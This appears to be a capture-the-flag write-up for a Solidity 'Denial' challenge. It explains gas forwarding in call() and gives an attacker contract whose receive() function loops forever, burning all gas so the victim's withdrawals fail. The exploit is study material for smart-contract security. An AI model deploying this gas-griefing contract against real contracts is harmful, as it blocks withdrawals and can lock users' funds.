## Description
An interesting fact about call() function is that it forwards the entire gas along with the call, if no gas value is specified in the call.

-call and send: Both methods return false if they fail and do not raise an exception. This allows the execution of the function to continue.
-transfer: Causes an exception and rolls back the transaction if it fails.

```
contract Lock{
    Denial public denial;

    function setDenial(address payable _denial) public {
        denial = Denial(_denial);
    }

    function setWithdrawPartner (address _partner) public {
        denial.setWithdrawPartner(_partner);
    }

    function withdraw () public{
        denial.withdraw();
    }

    receive() external payable {
        while (true){}
    }
}
```